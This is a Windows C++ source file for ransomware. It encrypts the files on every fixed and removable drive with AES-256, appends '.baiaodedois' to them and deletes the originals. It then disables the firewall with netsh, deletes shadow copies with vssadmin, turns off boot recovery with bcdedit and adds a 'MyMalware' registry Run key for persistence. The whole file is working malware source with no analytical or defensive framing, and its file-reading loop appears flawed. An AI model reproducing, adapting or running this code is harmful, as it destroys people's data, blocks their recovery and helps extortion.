#include <iostream>
#include <fstream>
#include <windows.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <vector>
#include <string>
#include <algorithm>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

// Function to enumerate all connected drives
std::vector<std::wstring> EnumerateDrives() {
    std::vector<std::wstring> drives;
    wchar_t drive[] = L"A:\\";
    DWORD driveMask = GetLogicalDrives();

    for (int i = 0; i < 26; ++i) {
        if (driveMask & (1 << i)) {
            drive[0] = L'A' + i;
            if (GetDriveType(drive) == DRIVE_FIXED || GetDriveType(drive) == DRIVE_REMOVABLE) {
                drives.push_back(drive);
            }
        }
    }
    return drives;
}

// Function to generate secure random bytes
std::vector<BYTE> GenerateRandomBytes(size_t length) {
    std::vector<BYTE> buffer(length);
    HCRYPTPROV hProv;

    if (CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        if (CryptGenRandom(hProv, static_cast<DWORD>(length), buffer.data())) {
            CryptReleaseContext(hProv, 0);
            return buffer;
        }
        CryptReleaseContext(hProv, 0);
    }

    throw std::runtime_error("Failed to generate random bytes.");
}

// Function to encrypt a file using AES-256 in CBC mode
bool EncryptFile(const std::wstring& filePath, const std::vector<BYTE>& key, const std::vector<BYTE>& iv) {
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile) return false;

    std::wstring encryptedFilePath = filePath + L".baiaodedois";
    std::ofstream outFile(encryptedFilePath, std::ios::binary);
    if (!outFile) return false;

    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    if (!CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return false;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptHashData(hHash, key.data(), static_cast<DWORD>(key.size()), 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, CRYPT_EXPORTABLE, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptSetKeyParam(hKey, KP_IV, iv.data(), 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    const DWORD bufferSize = 4096;
    BYTE buffer[bufferSize];
    DWORD bytesRead;

    while (inFile.read(reinterpret_cast<char*>(buffer), bufferSize)) {
        bytesRead = static_cast<DWORD>(inFile.gcount());
        if (!CryptEncrypt(hKey, 0, inFile.eof(), 0, buffer, &bytesRead, bufferSize)) {
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return false;
        }
        outFile.write(reinterpret_cast<char*>(buffer), bytesRead);
    }

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    inFile.close();
    outFile.close();

    // Delete the original file
    DeleteFile(filePath.c_str());
    return true;
}

// Function to modify firewall rules and disable Windows Defender Firewall
void DisableFirewall() {
    system("netsh advfirewall set allprofiles state off");
}

// Function to delete shadow copy volumes
void DeleteShadowCopies() {
    system("vssadmin delete shadows /all /quiet");
}

// Function to disable recovery mode
void DisableRecoveryMode() {
    system("bcdedit /set {default} recoveryenabled no");
}

// Function to add persistence to the Windows registry
void AddPersistence(const std::wstring& executablePath) {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, L"MyMalware", 0, REG_SZ, reinterpret_cast<const BYTE*>(executablePath.c_str()), static_cast<DWORD>((executablePath.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

// Function to display the key and IV in hexadecimal format
void PrintKeyAndIV(const std::vector<BYTE>& key, const std::vector<BYTE>& iv) {
    std::wcout << L"AES-256 Key: ";
    for (BYTE b : key) {
        wprintf(L"%02X", b);
    }
    std::wcout << std::endl;

    std::wcout << L"IV: ";
    for (BYTE b : iv) {
        wprintf(L"%02X", b);
    }
    std::wcout << std::endl;
}

int main() {
    // Generate a 32-byte (256-bit) key and a 16-byte (128-bit) IV
    std::vector<BYTE> key = GenerateRandomBytes(32); // AES-256 key
    std::vector<BYTE> iv = GenerateRandomBytes(16);  // Initialization vector

    // Display the generated key and IV (required for decryption)
    std::wcout << L"Generated Key and IV:" << std::endl;
    PrintKeyAndIV(key, iv);

    // Enumerate all connected drives
    std::vector<std::wstring> drives = EnumerateDrives();

    // Encrypt files on all drives
    for (const auto& drive : drives) {
        std::wstring searchPath = drive + L"*.*";
        WIN32_FIND_DATA findData;
        HANDLE hFind = FindFirstFile(searchPath.c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::wstring filePath = drive + findData.cFileName;
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    EncryptFile(filePath, key, iv);
                }
            } while (FindNextFile(hFind, &findData) != 0);
            FindClose(hFind);
        }
    }

    // Disable the firewall
    DisableFirewall();

    // Delete shadow copies
    DeleteShadowCopies();

    // Disable recovery mode
    DisableRecoveryMode();

    // Add persistence to the registry
    wchar_t executablePath[MAX_PATH];
    GetModuleFileName(nullptr, executablePath, MAX_PATH);
    AddPersistence(executablePath);

    return 0;
}
